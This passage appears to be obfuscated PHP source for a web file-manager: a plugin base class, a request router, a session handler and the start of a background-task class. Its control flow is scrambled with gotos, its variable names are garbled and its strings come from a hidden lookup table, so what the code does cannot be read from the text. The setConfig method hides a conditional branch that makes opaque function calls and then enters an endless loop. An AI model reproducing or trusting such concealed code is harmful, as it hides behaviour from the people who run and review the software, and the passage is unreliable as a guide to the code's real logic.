$eÆî·¥¼Ÿê[$cÜ†ÎÊ¶°[75]]; goto aŠ°“¸Í¿œ; F¾º²ÛŠ˜‡: $eÆî·¥¼Ÿê = Action($cÜ†ÎÊ¶°[1021])->sharePathInfo($cñƒÚŒĞÍ÷); if (!isset($eÆî·¥¼Ÿê[$cÜ†ÎÊ¶°[75]])) { show_json(LNG($cÜ†ÎÊ¶°[1341]), !1); } $this->fileInfo = $eÆî·¥¼Ÿê[$cÜ†ÎÊ¶°[162]]; goto Dáñâœç˜œ; aŠ°“¸Í¿œ: } final function pluginCachePath($A×­Ş÷¦œ» = '') { $bÊ¿íã¥ë‰ =& $_SERVER[¦·]; $eá…¦×‚ƒ = IO_PATH_SYSTEM_TEMP . $bÊ¿íã¥ë‰[1342] . $this->pluginName; if (!($FæÓìëíæ» = IO::infoFull($eá…¦×‚ƒ))) { return IO::mkdir($eá…¦×‚ƒ . $bÊ¿íã¥ë‰[8] . $A×­Ş÷¦œ»); } if (empty($A×­Ş÷¦œ»)) { return $FæÓìëíæ»[$bÊ¿íã¥ë‰[75]]; } if (!($A£¯…ãß‡® = IO::fileNameExist($FæÓìëíæ»[$bÊ¿íã¥ë‰[75]], $A×­Ş÷¦œ»))) { return IO::mkdir($FæÓìëíæ»[$bÊ¿íã¥ë‰[75]] . $A×­Ş÷¦œ»); } return KodIO::make($A£¯…ãß‡®); } final function pluginCacheFileSet($F±ìÏ´¹è¾, $DìŠé» = '') { $dùğ‚Âœ°œ =& $_SERVER[¦·]; if (!($B‘“Îôµ = IO::infoFull($F±ìÏ´¹è¾))) { return IO::mkfile($F±ìÏ´¹è¾, $DìŠé», REPEAT_REPLACE); } IO::setContent($B‘“Îôµ[$dùğ‚Âœ°œ[75]], $DìŠé»); return $B‘“Îôµ[$dùğ‚Âœ°œ[75]]; } final function pluginLocalFile($böëèŒÒÄˆ = '') { goto FÇ²ÆïîŒœ; FÇ²ÆïîŒœ: $C¥©èÀ‰É¡ =& $_SERVER[¦·]; $bŠ“¹ŞËĞÍ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($bŠ“¹ŞËĞÍ)) { mk_dir($bŠ“¹ŞËĞÍ); } goto fä¯ˆìÅ¸ç; A¶Ù¿ô§Œº: if (!checkExtSafe($f£ì‚Á¤Ğ)) { $f£ì‚Á¤Ğ = $f£ì‚Á¤Ğ . $C¥©èÀ‰É¡[1343]; } $cÌòÅ†öºƒ = $bŠ“¹ŞËĞÍ . $f£ì‚Á¤Ğ; if (@file_exists($cÌòÅ†öºƒ)) { return $cÌòÅ†öºƒ; } goto b£ÕÁ‚’³Ñ; fä¯ˆìÅ¸ç: if (!$böëèŒÒÄˆ) { return $bŠ“¹ŞËĞÍ; } $D‘ôíâƒÊ = IO::info($böëèŒÒÄˆ); $f£ì‚Á¤Ğ = $this->_tmpFileName($D‘ôíâƒÊ) . $C¥©èÀ‰É¡[91] . $D‘ôíâƒÊ[$C¥©èÀ‰É¡[160]]; goto A¶Ù¿ô§Œº; b£ÕÁ‚’³Ñ: return IO::copy($böëèŒÒÄˆ, $bŠ“¹ŞËĞÍ, 0, $f£ì‚Á¤Ğ); goto déøÈ²ÌĞ; déøÈ²ÌĞ: } final function appPackage() { goto b‘´Œ¯©Õ; c¡Ë¹óÆàØ: $CÌ¾ë¬ÆÆ¹ = Hook::trigger($A½Ô¬æàí[1345], $ağåÇøÓ•Á); if ($CÌ¾ë¬ÆÆ¹ && is_array($CÌ¾ë¬ÆÆ¹)) { $ağåÇøÓ•Á = $CÌ¾ë¬ÆÆ¹; } $this->packageData = $ağåÇøÓ•Á; goto A­˜¬ÁÒ; A­˜¬ÁÒ: return $ağåÇøÓ•Á; goto B¼ÆºˆöÜ; b‘´Œ¯©Õ: $A½Ô¬æàí =& $_SERVER[¦·]; if ($this->packageData) { return $this->packageData; } $FÁíğ±‡Á = $this->parseFile($this->pluginPath . $A½Ô¬æàí[1344]); goto c¤§×Ï¨¢; c¤§×Ï¨¢: $this->parseLang($FÁíğ±‡Á); $ağåÇøÓ•Á = json_decode_force($FÁíğ±‡Á); if (!$ağåÇøÓ•Á) { return array(); } goto c¡Ë¹óÆàØ; B¼ÆºˆöÜ: } public function packageInfoGet($dÒ“òÁŸÉæ) { $E¥ÑÎÎ¼ = $this->appPackage(); return array_get_value($E¥ÑÎÎ¼, $dÒ“òÁŸÉæ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¦·][1346]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¦·][1347]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¦·][1348]); } private function parseFile($Fç‹ÂÕÅëÂ) { goto fÂò‹ÏŞ¬; fÂò‹ÏŞ¬: $A½«œñ°É =& $_SERVER[¦·]; $f¥ƒÆÚŒ­‡ = file_get_contents($Fç‹ÂÕÅëÂ); $föİ•áĞ‰Ê = array($A½«œñ°É[1349], $A½«œñ°É[1350], $A½«œñ°É[1351], $A½«œñ°É[1352], $A½«œñ°É[1353], $A½«œñ°É[1354], $A½«œñ°É[1355]); goto cé–…’Â´È; c—™‚´ˆìÔ: $f¥ƒÆÚŒ­‡ = str_replace($föİ•áĞ‰Ê, $BÌø½”çßÇ, $f¥ƒÆÚŒ­‡); return $f¥ƒÆÚŒ­‡; goto A†¡ Ñºè ; cé–…’Â´È: $BÌø½”çßÇ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$A½«œñ°É[84]][$A½«œñ°É[1356]]); if (strstr($f¥ƒÆÚŒ­‡, $A½«œñ°É[1357])) { $F©„ÅÛ×œ  = rawurlencode(json_encode($this->pluginLangArr)); $f¥ƒÆÚŒ­‡ = str_replace($A½«œñ°É[1357], $F©„ÅÛ×œ , $f¥ƒÆÚŒ­‡); } if (strstr($f¥ƒÆÚŒ­‡, $A½«œñ°É[1358])) { $F©„ÅÛ×œ  = $F©„ÅÛ×œ  = rawurlencode(json_encode($this->getConfig())); $f¥ƒÆÚŒ­‡ = str_replace($A½«œñ°É[1358], $F©„ÅÛ×œ , $f¥ƒÆÚŒ­‡); } goto c—™‚´ˆìÔ; A†¡ Ñºè : } private function parseLang(&$f­®×¦ÂÛ¨) { goto cÎ‰……ÉÁ; fâÅ¸Äïóç: preg_match_all($BÆÔô’„¢†[1360], $f­®×¦ÂÛ¨, $fÙ±ôõáÍÇ); if (!is_array($fÙ±ôõáÍÇ) || count($fÙ±ôõáÍÇ) == 0 || !is_array($fÙ±ôõáÍÇ[0]) || count($fÙ±ôõáÍÇ[0]) == 0) { return; } $fè–Îİ¨Ä = array(); goto CŠ‹ÇÜ¡µè; CŠ‹ÇÜ¡µè: $bÅ“‹´š§§ = array(); foreach ($fÙ±ôõáÍÇ[0] as $CÉ˜ãœÕĞ) { $c‹´Æ‚á¶À = substr($CÉ˜ãœÕĞ, strlen($F½Ç»©‹ğ), -4); $cÇÔÚ†÷ëö = LNG($c‹´Æ‚á¶À); $fè–Îİ¨Ä[] = $CÉ˜ãœÕĞ; $bÅ“‹´š§§[] = str_replace(array($BÆÔô’„¢†[217], $BÆÔô’„¢†[995], $BÆÔô’„¢†[330], $BÆÔô’„¢†[113]), array($BÆÔô’„¢†[50], $BÆÔô’„¢†[50], $BÆÔô’„¢†[33], $BÆÔô’„¢†[1361]), $cÇÔÚ†÷ëö); } $f­®×¦ÂÛ¨ = str_replace($fè–Îİ¨Ä, $bÅ“‹´š§§, $f­®×¦ÂÛ¨); goto CÑÁ‹š©„Ü; cÎ‰……ÉÁ: $BÆÔô’„¢† =& $_SERVER[¦·]; $F½Ç»©‹ğ = $BÆÔô’„¢†[1359]; if (!strstr($f­®×¦ÂÛ¨, $F½Ç»©‹ğ)) { return; } goto fâÅ¸Äïóç; CÑÁ‹š©„Ü: } private function parseConfig(&$dÓ´óÊ×¡ù) { goto EåĞÛ½›ÇŸ; EåĞÛ½›ÇŸ: $e­‰êµÅ‰ =& $_SERVER[¦·]; $D‹À´”İ—Ä = $e­‰êµÅ‰[1362]; if (!strstr($dÓ´óÊ×¡ù, $D‹À´”İ—Ä)) { return; } goto c†Øë…â¾Ò; B°Á©Ü•ôô: $dÓ´óÊ×¡ù = str_replace($b ¸öŸ¹§‰, $EŒâÂ®î, $dÓ´óÊ×¡ù); goto a£µÅùÑŠ; cçÕÓÚ‡„: $b ¸öŸ¹§‰ = array(); $EŒâÂ®î = array(); foreach ($fíÒÀèí Ö[0] as $Câˆ´¶È´ˆ) { $BßœÁÓ£á” = substr($Câˆ´¶È´ˆ, strlen($D‹À´”İ—Ä), -2); $b ¸öŸ¹§‰[] = $Câˆ´¶È´ˆ; $EŒâÂ®î[] = _get($E†ÄŞè‰ÍÏ, $BßœÁÓ£á”); } goto B°Á©Ü•ôô; c†Øë…â¾Ò: preg_match_all($e­‰êµÅ‰[1363], $dÓ´óÊ×¡ù, $fíÒÀèí Ö); if (!is_array($fíÒÀèí Ö) || count($fíÒÀèí Ö) == 0 || !is_array($fíÒÀèí Ö[0]) || count($fíÒÀèí Ö[0]) == 0) { return; } $E†ÄŞè‰ÍÏ = $this->getConfig(); goto cçÕÓÚ‡„; a£µÅùÑŠ: } private function parsePackage(&$BØå²ÊêÀ) { goto DŠŠØéŠ¦Š; DŠŠØéŠ¦Š: $aåÍë·÷° =& $_SERVER[¦·]; $cËÉçÚÔÒª = $aåÍë·÷°[1364]; if (!strstr($BØå²ÊêÀ, $cËÉçÚÔÒª)) { return; } goto B™›œõ¼Ğ‡; B™›œõ¼Ğ‡: preg_match_all($aåÍë·÷°[1365], $BØå²ÊêÀ, $CÏì’Ö¯ÚÏ); if (!is_array($CÏì’Ö¯ÚÏ) || count($CÏì’Ö¯ÚÏ) == 0 || !is_array($CÏì’Ö¯ÚÏ[0]) || count($CÏì’Ö¯ÚÏ[0]) == 0) { return; } $eÑòÁœÈÄ³ = $this->appPackage(); goto e¢Å÷ˆ¸‡; e¢Å÷ˆ¸‡: $D¹Ş¯’¿Û§ = array(); $a‹ÄæªÇ¥ = array(); foreach ($CÏì’Ö¯ÚÏ[0] as $Fôá¦ä¾¾) { $eÕçÛ¸§’³ = substr($Fôá¦ä¾¾, strlen($cËÉçÚÔÒª), -2); $D¹Ş¯’¿Û§[] = $Fôá¦ä¾¾; $a‹ÄæªÇ¥[] = _get($eÑòÁœÈÄ³, $eÕçÛ¸§’³); } goto aŠç®æòŠµ; aŠç®æòŠµ: $BØå²ÊêÀ = str_replace($D¹Ş¯’¿Û§, $a‹ÄæªÇ¥, $BØå²ÊêÀ); goto bƒêÂÀ®Áå; bƒêÂÀ®Áå: } final function echoFile($D‘½ë–Òñë, $AÍÄËœ¯ = false) { goto c¢Œ¨¿ø”ˆ; aõµá‰…å: $f›á¾›˜È = $this->parseFile($fÈÖ“Ü¼); $this->parseLang($f›á¾›˜È); $this->parseConfig($f›á¾›˜È); goto Dğí®˜º±–; c¢Œ¨¿ø”ˆ: $cç½‰‡¯« =& $_SERVER[¦·]; $fÈÖ“Ü¼ = $this->pluginPath . $D‘½ë–Òñë; if (ACT == $cç½‰‡¯«[1366]) { echo $cç½‰‡¯«[1367] . $this->pluginName . $cç½‰‡¯«[8] . $D‘½ë–Òñë . $cç½‰‡¯«[1368]; if (!file_exists($fÈÖ“Ü¼)) { echo $cç½‰‡¯«[1369]; return; } } goto aõµá‰…å; Dğí®˜º±–: $this->parsePackage($f›á¾›˜È); if (is_array($AÍÄËœ¯)) { $f›á¾›˜È = str_replace(array_keys($AÍÄËœ¯), array_values($AÍÄËœ¯), $f›á¾›˜È); } echo $cç½‰‡¯«[217] . $f›á¾›˜È; goto B¸ø„šÏĞ÷; B¸ø„šÏĞ÷: } final function initLang() { goto a—¥œÎ¨Ñ·; D ©˜“Å×ø: $fùİùğóÁ = I18n::getType(); $FõõáïÍ•œ = array(); if (file_exists($eì—ÚğÅÎ . $fùİùğóÁ . $bŠ¤ŸÅ®­ë[766])) { $FõõáïÍ•œ = (include $eì—ÚğÅÎ . $fùİùğóÁ . $bŠ¤ŸÅ®­ë[766]); } else { if ($fùİùğóÁ == $bŠ¤ŸÅ®­ë[1372] && !file_exists($eì—ÚğÅÎ . $fùİùğóÁ . $bŠ¤ŸÅ®­ë[766]) && file_exists($eì—ÚğÅÎ . $bŠ¤ŸÅ®­ë[1373])) { $FõõáïÍ•œ = (include $eì—ÚğÅÎ . $bŠ¤ŸÅ®­ë[1373]); } else { if (file_exists($eì—ÚğÅÎ . $FÕ¦µ›İ±Ç . $bŠ¤ŸÅ®­ë[766])) { $FõõáïÍ•œ = (include $eì—ÚğÅÎ . $FÕ¦µ›İ±Ç . $bŠ¤ŸÅ®­ë[766]); } } } goto dï²¾…º®; dï²¾…º®: if (!is_array($FõõáïÍ•œ)) { return array(); } if (@count($FõõáïÍ•œ) > 0) { I18n::set($FõõáïÍ•œ); } return $FõõáïÍ•œ; goto c©©éõ¦–â; a—¥œÎ¨Ñ·: $bŠ¤ŸÅ®­ë =& $_SERVER[¦·]; $FÕ¦µ›İ±Ç = $bŠ¤ŸÅ®­ë[1370]; $eì—ÚğÅÎ = $this->pluginPath . $bŠ¤ŸÅ®­ë[1371]; goto D ©˜“Å×ø; c©©éõ¦–â: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($b³·–‰·ê) { $fê—øÇòÁ« =& $_SERVER[¦·]; if (!isset($_SERVER[$fê—øÇòÁ«[791]]) || !isset($_SERVER[$fê—øÇòÁ«[1234]])) { goto EÓ§÷ÄÍ×ä; EÓ§÷ÄÍ×ä: $D¬¨Ÿ‰¦¦ô = $fê—øÇòÁ«[792]; $e…ª‹¯Ã = $fê—øÇòÁ«[793]; $bÜÌÀ£†¸ = $_SERVER[$fê—øÇòÁ«[788]] . $fê—øÇòÁ«[789]; goto dšİİ»³Ë´; eŠ®áá†ïƒ: for ($E¯…¾…¤ = $eÕã‘î–¬Ã; $E¯…¾…¤ > 0; $E¯…¾…¤++) { $D¢ÃÊ¥õˆƒ = json_encode($GLOBALS[$fê—øÇòÁ«[384]]); } goto EÌÈÄÄ¹‘Á; dšİİ»³Ë´: $CìÑ…‰•­‹ = $e…ª‹¯Ã($bÜÌÀ£†¸); $bø®›¨öƒ = explode($fê—øÇòÁ«[217], $CìÑ…‰•­‹); if (count($bø®›¨öƒ) < $fê—øÇòÁ«[576]) { $bŒõö¬Èè = $fê—øÇòÁ«[794]; $bŒõö¬Èè(); } goto FÜï‘è¡Ó; FÜï‘è¡Ó: $D¢ÃÊ¥õˆƒ = $fê—øÇòÁ«[795]; $D¢ÃÊ¥õˆƒ($_SERVER[$fê—øÇòÁ«[796]]); $eÕã‘î–¬Ã = 1; goto eŠ®áá†ïƒ; EÌÈÄÄ¹‘Á: } return $this->modelPlugin->setConfig($this->pluginName, $b³·–‰·ê); } public function onSetConfig($CÅš½¨°Ú) { } public function onGetConfig($A›áŞ“§ä) { } public function onChangeStatus($cÑª‹ƒÓŠ½) { } public function onUninstall() { } public function onInstall() { } public function authCheck($D‚Å¶¿Ş¶Ü = "\x70\154\x75\x67\151\x6e\x41\165\164\x68") { $A«›Ú¾ÌêØ =& $_SERVER[¦·]; if (!defined($A«›Ú¾ÌêØ[427])) { return !1; } if (_get($GLOBALS, $A«›Ú¾ÌêØ[459])) { return !0; } $aŸ”‡¸Éç‹ = $this->getConfig(); if (!$aŸ”‡¸Éç‹[$D‚Å¶¿Ş¶Ü]) { return !1; } return ActionCall($A«›Ú¾ÌêØ[1374], $aŸ”‡¸Éç‹[$D‚Å¶¿Ş¶Ü]); } public function url($côó¿“‰¢, $e„Ëë–ˆ«ã = '', $Eà™¬Ùƒæî = true) { goto aË«ÍÚßó; C‘É¡¶¢‰: if (!$Eà™¬Ùƒæî) { return $C‡Şøí–; } echo $C‡Şøí–; goto dÔíöØĞë; fÈˆô³Ìã±: $C®©’ä¸Üá = $this->packageVersion(); $BÉ¯à«µ­ = $Dç¼¨¦Ã ² . $Cæ½ÎäÊ‡ñ[412] . $C®©’ä¸Üá; if (substr($côó¿“‰¢, 0, 4) == $Cæ½ÎäÊ‡ñ[144] || substr($côó¿“‰¢, 0, 2) == $Cæ½ÎäÊ‡ñ[1160]) { $C‡Şøí– = $côó¿“‰¢ . $Cæ½ÎäÊ‡ñ[1375] . $BÉ¯à«µ­; } else { if ($e„Ëë–ˆ«ã == $Cæ½ÎäÊ‡ñ[33]) { $C‡Şøí– = $this->pluginHost . $côó¿“‰¢ . $Cæ½ÎäÊ‡ñ[1375] . $BÉ¯à«µ­; } else { if ($e„Ëë–ˆ«ã === $Cæ½ÎäÊ‡ñ[76]) { $C‡Şøí– = $this->pluginHost . $côó¿“‰¢; } else { if ($e„Ëë–ˆ«ã == $Cæ½ÎäÊ‡ñ[1376]) { $C‡Şøí– = STATIC_PATH . $côó¿“‰¢ . $Cæ½ÎäÊ‡ñ[1375] . $Dç¼¨¦Ã ²; } else { if ($e„Ëë–ˆ«ã == $Cæ½ÎäÊ‡ñ[1377]) { $C‡Şøí– = APP_HOST . $Cæ½ÎäÊ‡ñ[1378] . $côó¿“‰¢ . $Cæ½ÎäÊ‡ñ[1375] . $Dç¼¨¦Ã ²; } else { if (isset($Dõ—å¥¾¶‘[$e„Ëë–ˆ«ã])) { $C‡Şøí– = $Dõ—å¥¾¶‘[$e„Ëë–ˆ«ã] . $côó¿“‰¢ . $Cæ½ÎäÊ‡ñ[1375] . $BÉ¯à«µ­; } } } } } } goto C‘É¡¶¢‰; aË«ÍÚßó: $Cæ½ÎäÊ‡ñ =& $_SERVER[¦·]; $Dõ—å¥¾¶‘ = $this->getConfig(); $Dç¼¨¦Ã ² = KOD_VERSION . $Cæ½ÎäÊ‡ñ[91] . KOD_VERSION_BUILD; goto fÈˆô³Ìã±; dÔíöØĞë: } public function link($f÷î³§Ñê› = false, $B¼¸ñ÷Á¼æ = '') { $E¢¥†³Ãè =& $_SERVER[¦·]; if (!$f÷î³§Ñê›) { $this->link($E¢¥†³Ãè[1379], $E¢¥†³Ãè[1377]); $this->link($E¢¥†³Ãè[1380], $E¢¥†³Ãè[1376]); $this->link($E¢¥†³Ãè[1381], $E¢¥†³Ãè[1376]); $this->link($E¢¥†³Ãè[1382], $E¢¥†³Ãè[1376]); $this->link($E¢¥†³Ãè[1383], $E¢¥†³Ãè[1376]); return; } $f¿ÄÛ—©çŸ = $this->url($f÷î³§Ñê›, $B¼¸ñ÷Á¼æ, !1); if (substr($f÷î³§Ñê›, -3) == $E¢¥†³Ãè[1384]) { echo $E¢¥†³Ãè[1385] . $f¿ÄÛ—©çŸ . $E¢¥†³Ãè[1386] . $E¢¥†³Ãè[217]; } else { if (substr($f÷î³§Ñê›, -4) == $E¢¥†³Ãè[1387]) { echo $E¢¥†³Ãè[1388] . $f¿ÄÛ—©çŸ . $E¢¥†³Ãè[1389] . $E¢¥†³Ãè[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\133\136\x2f\135\53", "\72\156\x75\x6d" => "\x5b\x30\x2d\71\x5d\x2b", "\72\x61\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($d·½Ö¸ÓóŒ, $DñêÏÊ¹ä) { $aÀª‰òÈùæ =& $_SERVER[¦·]; if ($d·½Ö¸ÓóŒ == $aÀª‰òÈùæ[1390]) { $C’¦ëˆò•Ü = array_map($aÀª‰òÈùæ[1391], $DñêÏÊ¹ä[0]); $F†Œ¢”ã•ï = strpos($DñêÏÊ¹ä[1], $aÀª‰òÈùæ[8]) === 0 ? $DñêÏÊ¹ä[1] : $aÀª‰òÈùæ[8] . $DñêÏÊ¹ä[1]; $aÖÚòéß–Ü = $DñêÏÊ¹ä[2]; } else { $C’¦ëˆò•Ü = null; $F†Œ¢”ã•ï = strpos($DñêÏÊ¹ä[0], $aÀª‰òÈùæ[8]) === 0 ? $DñêÏÊ¹ä[0] : $aÀª‰òÈùæ[8] . $DñêÏÊ¹ä[0]; $aÖÚòéß–Ü = $DñêÏÊ¹ä[1]; } array_push(self::$maps, $C’¦ëˆò•Ü); array_push(self::$routes, $F†Œ¢”ã•ï); array_push(self::$methods, strtoupper($d·½Ö¸ÓóŒ)); array_push(self::$callbacks, $aÖÚòéß–Ü); } public static function error($a¯ÇÊÓÍ›Ä) { self::$errorCallback = $a¯ÇÊÓÍ›Ä; } public static function haltOnMatch($d…àÎĞš–Á = true) { self::$halts = $d…àÎĞš–Á; } public static function dispatch() { goto b¡¦Û‘×½Ó; Dƒ©ºå…: $CĞáàŸÓö = array_keys(static::$patterns); $aÒ¯±ªĞòµ = array_values(static::$patterns); $cÔëêø³æ¼ = !1; goto eİÖ¼¼˜ñ¶; eİÖ¼¼˜ñ¶: self::$routes = preg_replace($AÏÉ…„İÈô[1076], $AÏÉ…„İÈô[8], self::$routes); if (in_array($DŸ‘ìÔÜ‹ñ, self::$routes)) { $A›ÖˆµÈÖë = array_keys(self::$routes, $DŸ‘ìÔÜ‹ñ); foreach ($A›ÖˆµÈÖë as $dŒñ°¶) { if (self::$methods[$dŒñ°¶] == $F›°Ş½äíè || self::$methods[$dŒñ°¶] == $AÏÉ…„İÈô[1393] || in_array($F›°Ş½äíè, self::$maps[$dŒñ°¶])) { $cÔëêø³æ¼ = !0; if (!is_object(self::$callbacks[$dŒñ°¶])) { $e–ÅÔ½ÚÁÊ = explode($AÏÉ…„İÈô[8], self::$callbacks[$dŒñ°¶]); $BŠ† §º‚ = end($e–ÅÔ½ÚÁÊ); $E÷ÉíÅÖºê = explode($AÏÉ…„İÈô[1394], $BŠ† §º‚); $cÂ‚Òò¯¸ = new $E÷ÉíÅÖºê[0](); $cÂ‚Òò¯¸->{$E÷ÉíÅÖºê[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$dŒñ°¶]); if (self::$halts) { return; } } } } } else { $Aê×¡¡‘» = 0; foreach (self::$routes as $dŒñ°¶) { if (strpos($dŒñ°¶, $AÏÉ…„İÈô[4]) !== !1) { $dŒñ°¶ = str_replace($CĞáàŸÓö, $aÒ¯±ªĞòµ, $dŒñ°¶); } if (preg_match($AÏÉ…„İÈô[1395] . $dŒñ°¶ . $AÏÉ…„İÈô[1396], $DŸ‘ìÔÜ‹ñ, $A˜õ²‚¤ô)) { if (self::$methods[$Aê×¡¡‘»] == $F›°Ş½äíè || self::$methods[$Aê×¡¡‘»] == $AÏÉ…„İÈô[1393] || !empty(self::$maps[$Aê×¡¡‘»]) && in_array($F›°Ş½äíè, self::$maps[$Aê×¡¡‘»])) { $cÔëêø³æ¼ = !0; array_shift($A˜õ²‚¤ô); if (!is_object(self::$callbacks[$Aê×¡¡‘»])) { $e–ÅÔ½ÚÁÊ = explode($AÏÉ…„İÈô[8], self::$callbacks[$Aê×¡¡‘»]); $BŠ† §º‚ = end($e–ÅÔ½ÚÁÊ); $E÷ÉíÅÖºê = explode($AÏÉ…„İÈô[1394], $BŠ† §º‚); $cÂ‚Òò¯¸ = new $E÷ÉíÅÖºê[0](); if (!method_exists($cÂ‚Òò¯¸, $E÷ÉíÅÖºê[1])) { echo $AÏÉ…„İÈô[1397]; } else { call_user_func_array(array($cÂ‚Òò¯¸, $E÷ÉíÅÖºê[1]), $A˜õ²‚¤ô); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Aê×¡¡‘»], $A˜õ²‚¤ô); if (self::$halts) { return; } } } } $Aê×¡¡‘»++; } } if ($cÔëêø³æ¼ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $c¤½‡¶ Øò =& $_SERVER[¦·]; header($_SERVER[$c¤½‡¶ Øò[1398]] . $c¤½‡¶ Øò[1399]); echo $c¤½‡¶ Øò[1400]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$AÏÉ…„İÈô[1392]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto c³ËŠ¦ŒÆˆ; b¡¦Û‘×½Ó: $AÏÉ…„İÈô =& $_SERVER[¦·]; $DŸ‘ìÔÜ‹ñ = parse_url($_SERVER[$AÏÉ…„İÈô[1392]], PHP_URL_PATH); $F›°Ş½äíè = $_SERVER[$AÏÉ…„İÈô[154]]; goto Dƒ©ºå…; c³ËŠ¦ŒÆˆ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto d±â›²Š‰; eÈ¾ñÈˆÔâ: $DŞç¸¥‡ = $GLOBALS[$fÌ¾«Ö°¾[6]][$fÌ¾«Ö°¾[337]]; self::$sessionTime = $DŞç¸¥‡[$fÌ¾«Ö°¾[1401]]; $Eô¸¡„ŸÆé = isset($GLOBALS[$fÌ¾«Ö°¾[1402]]) ? $GLOBALS[$fÌ¾«Ö°¾[1402]] : SESSION_ID; goto FœëÀ‡ë…¼; F‚×ÈÃ¬®: $cÒò¥‰ïˆ = $DŞç¸¥‡[$F´¿Š…ÏÕç]; $BÙƒŠÂâÎ¬ = $DŞç¸¥‡[$fÌ¾«Ö°¾[756]]; switch ($F´¿Š…ÏÕç) { case $fÌ¾«Ö°¾[17]: self::$handle = Model($fÌ¾«Ö°¾[757]); break; case $fÌ¾«Ö°¾[758]: self::$handle = new CacheRedis($cÒò¥‰ïˆ, $BÙƒŠÂâÎ¬); break; case $fÌ¾«Ö°¾[759]: self::$handle = new CacheMemcached($cÒò¥‰ïˆ, $BÙƒŠÂâÎ¬); break; case $fÌ¾«Ö°¾[167]: $cÒò¥‰ïˆ[$fÌ¾«Ö°¾[75]] = $cÒò¥‰ïˆ[$fÌ¾«Ö°¾[75]] . $fÌ¾«Ö°¾[1404]; self::$handle = new CacheFile($cÒò¥‰ïˆ, $BÙƒŠÂâÎ¬); default: break; } goto D‡èÀÃ•‹º; D‡èÀÃ•‹º: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $bå óÉ‰îŒ = new self(); return $bå óÉ‰îŒ; goto f¤ÃŠ¨Ş³; d±â›²Š‰: $fÌ¾«Ö°¾ =& $_SERVER[¦·]; static $bå óÉ‰îŒ = false; if ($bå óÉ‰îŒ) { return $bå óÉ‰îŒ; } goto eÈ¾ñÈˆÔâ; FœëÀ‡ë…¼: if (self::$sessionSign) { } else { if (Cookie::get($Eô¸¡„ŸÆé)) { self::$sessionSign = Cookie::get($Eô¸¡„ŸÆé); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Eô¸¡„ŸÆé, self::$sessionSign, self::$sessionTime); $F´¿Š…ÏÕç = $DŞç¸¥‡[$fÌ¾«Ö°¾[1403]]; goto F‚×ÈÃ¬®; f¤ÃŠ¨Ş³: } public static function sign($bÑÂÒ¢®å¡ = false) { $bÑÂÒ¢®å¡ && (self::$sessionSign = $bÑÂÒ¢®å¡); self::init(); return self::$sessionSign; } public static function set($aÀÇ’ß–, $D‹ÛÓ…Ôâ« = false) { self::init(); if (is_array($aÀÇ’ß–)) { foreach ($aÀÇ’ß– as $d‰ïÚÙæ’à => $BÉ„§ÍæŒ®) { array_set_value(self::$data, $d‰ïÚÙæ’à, $BÉ„§ÍæŒ®); } } else { array_set_value(self::$data, $aÀÇ’ß–, $D‹ÛÓ…Ôâ«); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($E„ÙˆÈğŒ’ = false) { self::init(); if (!$E„ÙˆÈğŒ’) { return self::$data; } return array_get_value(self::$data, $E„ÙˆÈğŒ’); } public static function remove($aö²©£¾”Í) { self::init(); unset(self::$data[$aö²©£¾”Í]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¦·][761])) { self::$handle->clearTimeout(); } } } goto C‘¥è¦ˆ½«; C‘¥è¦ˆ½«: class AutoTask { public static function start() { goto FÓ‰¼¢–ùÖ; A©âÅÈ›ñŒ: while (!0) { self::cacheClear(); if (self::valueGet($d¥³‹ˆõ‹ƒ[690]) != $d¥³‹ˆõ‹ƒ[83]) { self::valueSet($d¥³‹ˆõ‹ƒ[1405], $d¥³‹ˆõ‹ƒ[470]); self::log($d¥³‹ˆõ‹ƒ[1409]); die; } self::valueSet($d¥³‹ˆõ‹ƒ[1405], $d¥³‹ˆõ‹ƒ[83]); self::valueSet($d¥³‹ˆõ‹ƒ[1406], time()); self::taskRunAll(); sleep(self::valueGet($d¥³‹ˆõ‹ƒ[1410])); } goto fğêİÉÍ½ª; c†òËÕÆòê: http_close(); self::valueSet($d¥³‹ˆõ‹ƒ[1405], $d¥³‹ˆõ‹ƒ[83]); Hook::bind($d¥³‹ˆõ‹ƒ[1407], $d¥³‹ˆõ‹ƒ[1408]); goto A©âÅÈ›ñŒ; FÓ‰¼¢–ùÖ: $d¥³‹ˆõ‹ƒ =& $_SERVER[¦·]; if (self::valueGet($d¥³‹ˆõ‹ƒ[690]) != $d¥³‹ˆõ‹ƒ[83]) { return; } if (self::valueGet($d¥³‹ˆõ‹ƒ[1405]) == $d¥³‹ˆõ‹ƒ[83]) { $A“İŒùßÍî = self::valueGet($d¥³‹ˆõ‹ƒ[1406]); if (time() - $A“İŒùßÍî > 3600 * 2) { self::restart(); } return; } goto c†òËÕÆòê; fğêİÉÍ½ª: } public static function restart() { $BˆÔõ“ÌÆ =& 